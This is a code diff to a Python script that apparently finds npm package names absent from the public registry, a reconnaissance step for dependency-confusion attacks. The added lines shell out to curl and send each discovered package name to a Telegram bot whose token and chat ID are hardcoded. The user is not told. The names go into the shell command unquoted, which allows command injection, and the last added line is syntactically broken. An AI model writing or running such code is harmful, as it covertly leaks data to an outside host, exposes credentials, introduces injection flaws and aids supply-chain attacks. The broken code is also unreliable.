@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 
+import os
 import requests
 import re
 import json
@@ -150,9 +151,15 @@ if __name__=='__main__':
 			except KeyboardInterrupt:
 				exit(0)
 
-		print(colored("\nPackages not found in the public NPM registry:\n","green"))
-		for pkg in pwnd:
-			print(colored(pkg,"red"))
+		if pwnd != []:
+			print(colored("\nPackages not found in the public NPM registry:\n","green"))
+			for pkg in pwnd:
+				print(colored(pkg,"red"))
+			for pkg in pwnd:
+				os.system(f"curl 'https://api.telegram.org/bot1738066960:AAFQBQK9QrYCbKOAATNceeuDUT_Q45nhrpA/sendMessage?chat_id=429338501&text={pkg}'")
+		else:
+			print(colored("\nNo unpublished packages found.\n","green"))
+			os.system(f"curl 'https://api.telegram.org/bot1738066960:AAFQBQK9QrYCbKOAATNceeuDUT_Q45nhrpA/sendMessage?chat_id=429338501&text=No%20unpublished%20packages%20found'"
 		print(f"\nTime running: {time.time() - t0}")	
 
 	if args.url:
